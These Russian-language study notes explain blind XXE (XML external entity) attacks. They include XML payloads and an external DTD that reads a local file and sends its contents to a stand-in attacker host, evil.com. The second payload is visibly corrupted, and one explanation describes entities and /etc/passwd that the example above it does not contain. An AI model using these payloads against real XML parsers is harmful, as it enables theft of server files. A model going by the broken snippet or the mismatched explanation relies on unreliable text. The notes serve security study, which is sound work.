Так же как и XSS blind это слепые уязвимости которые напрямую не выдают ответ. При таком сценарии есть вариант эксплуатации. Ход событий при эксплуатации слепой XXE

### Поиск данной уязвимости 

Проверка наличия уязвимости Blind XXE (XML External Entity) можно пропинговать. Настроив сервер на запись логов о входящих запросов
```
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE example [
   <!ENTITY xxe SYSTEM "https://evil.com/externalDTD">
 ]>
 <example>
	 &xxe;
 </example>
```
![[Pasted image 20250114151441.png]]

Или **параметризованная внешняя сущность**
```
<Pxml version="1.0" encoding="utf-8"?>
<! DOCTYPE example [
	‹!ENTITY % xxe SYSTEM
		"https://*free.beeceptor.com/xxe_endpoint"›
	%xxe;
]>
<example> 
</examples
```
##### Что здесь происходит?

1. **Объявление XML-документа**:
    - `<?xml version="1.0" encoding="utf-8"?>` — это стандартное объявление XML-документа. Оно указывает версию XML и кодировку.
    
1. **Определение DTD**:
    - `<!DOCTYPE example [...]>` — это определение DTD (Document Type Definition). Оно описывает структуру документа и может содержать сущности.
    
1. **Параметризованная внешняя сущность**:
    - `<!ENTITY % xxe SYSTEM "https://free.beeceptor.com/xxe_endpoint">` — это определение **параметризованной внешней сущности**.
        
        - `%xxe;` — это имя сущности. Оно начинается с `%`, что указывает на то, что это параметрическая сущность.
            
        - `SYSTEM "https://free.beeceptor.com/xxe_endpoint"` — это указание на внешний ресурс (в данном случае — URL).

4. **Использование параметрической сущности**:
    
    - `%xxe;` — это вызов параметрической сущности. Когда XML-парсер обрабатывает этот код, он пытается загрузить данные по указанному URL (`https://free.beeceptor.com/xxe_endpoint`).

5. **Тело XML-документа**:
    
    - `<example></example>` — это корневой элемент XML-документа. В данном случае он пустой.

##### В этом примере:
1. `%xxe;` загружает содержимое файла `/etc/passwd`.
2. `%param;` создает новую сущность `%query;`, которая отправляет данные на сервер злоумышленника (`https://evil.com/xxe_endpoint`).
3. `&query;` выполняет запрос, отправляя содержимое файла на удаленный сервер.

# Пример раскрутки данной уязвимости 

1. Подготовка XML-запроса:
   - Атакующий формирует XML-документ с использованием внешнего DTD:
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE r [
  <!ELEMENT r ANY>
  <!ENTITY % extDTD SYSTEM "https://evil.com/externalDTD">
  %extDTD; <!-- Загружает внешний DTD -->
  %param;  <!-- Здесь определена сущность %param -->
  %query;  <!-- Здесь определена сущность %query -->
]>
<r></r>
```

### Как это работает?
- **Внешний DTD**: Атакующий указывает URL на внешний DTD (`https://evil.com/externalDTD`), который будет загружен сервером.
- **Сущности**: Внешний DTD определяет сущности, которые будут использоваться для извлечения данных.

## 2. Сервер обрабатывает запрос

Сервер принимает XML-документ и пытается его обработать. В процессе обработки сервер загружает внешний DTD из указанного URL.

### Что происходит на сервере?
1. **Загрузка DTD**: Сервер загружает DTD с `https://evil.com/externalDTD`.
2. **Определение сущностей**: Внешний DTD определяет сущности, которые будут использоваться для извлечения данных.

### Пример внешнего DTD:
```
<!ENTITY % file SYSTEM "file:///path/to/file">
<!ENTITY % param "<!ENTITY &#x25; query SYSTEM 'https://evil.com/xxe_endpoint?data=%file;'>">
```

#### Как это работает?
- **Сущность `%file`**: Указывает на локальный файл, который нужно извлечь.
- **Сущность `%param`**: Определяет сущность `%query`, которая будет использоваться для отправки данных на сервер злоумышленника

- `&#x25;` — это числовая ссылка на символ `%` (процент).
    - `&#x` указывает, что используется шестнадцатеричное представление.        
    - `25` — это шестнадцатеричное значение символа `%` в таблице ASCII/Unicode.
	Это надо чтоб использовать символ `%` внутри значения сущности, тем самым его нужно экранировать, чтобы он не интерпретировался как начало новой параметрической сущности.
## 3. Определение сущностей на сервере

Сервер возвращает ответ, содержащий определения сущностей, которые будут использоваться для извлечения данных.

## 4. Вызов параметра

Парсер использует сущность `%param`, что приводит к вызову сущности `%query`. Это вызывает запрос к серверу злоумышленника с данными из локального файла.

### Пример вызова параметра:
```
<!ENTITY &#x25; query SYSTEM 'https://evil.com/xxe_endpoint?data=%file;'>
```
#### Как это работает?
- **Запрос к серверу злоумышленника**: Парсер отправляет запрос на `https://evil.com/xxe_endpoint` с данными из локального файла.
- **Передача данных**: Данные из локального файла передаются в параметре `data`.

